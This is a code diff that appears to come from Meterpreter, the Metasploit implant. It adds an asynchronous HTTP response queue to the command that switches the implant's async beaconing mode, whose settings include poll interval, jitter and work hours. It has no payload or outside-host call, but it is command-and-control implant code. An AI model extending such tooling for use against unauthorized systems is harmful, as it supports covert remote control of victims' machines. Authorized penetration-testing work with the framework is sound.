@@ -3,6 +3,7 @@
  * @brief Handles the core async mode command for HTTP transports.
  */
 #include "metsrv.h"
+#include "server_transport_winhttp.h"
 
 // Explicit leases keep a queued job responsive without guessing from recent
 // packet activity. The bounded TTL returns the target to scheduled polling if
@@ -126,6 +127,7 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 	Packet* response = met_api->packet.create_response(packet);
 	DWORD result = ERROR_SUCCESS;
 	Transport* transport = remote->transport;
+	BOOL stopResponseQueue = FALSE;
 
 	// Async mode is only supported on HTTP transports
 	if (!(transport->type & METERPRETER_TRANSPORT_HTTP))
@@ -138,10 +140,18 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;
 
 		BOOL enabled = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_ASYNC_ENABLED);
-		ctx->async_mode = enabled;
 
 		if (enabled)
 		{
+			if (!async_http_response_queue_start(remote))
+			{
+				dprintf("[ASYNC] Unable to start response queue");
+				result = ERROR_NOT_ENOUGH_MEMORY;
+				ctx->async_mode = FALSE;
+				goto respond;
+			}
+
+			ctx->async_mode = TRUE;
 			UINT pollInterval = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_POLL_INTERVAL);
 			UINT pollJitter = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_POLL_JITTER);
 			UINT workStart = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_START);
@@ -200,6 +210,8 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 		}
 		else
 		{
+			ctx->async_mode = FALSE;
+			stopResponseQueue = TRUE;
 			dprintf("[ASYNC] Async mode disabled");
 
 			// Signal the wake event to interrupt any in-progress async sleep
@@ -220,10 +232,15 @@ DWORD request_core_async_mode(Remote* remote, Packet* packet)
 			ctx->async_lease_deadline_ticks = 0;
 		}
 
+	respond:
 		met_api->packet.add_tlv_bool(response, TLV_TYPE_ASYNC_ENABLED, ctx->async_mode);
 	}
 
 	met_api->packet.transmit_response(result, remote, response);
+	if (stopResponseQueue)
+	{
+		async_http_response_queue_stop_when_idle(remote);
+	}
 
 	return result;
 }
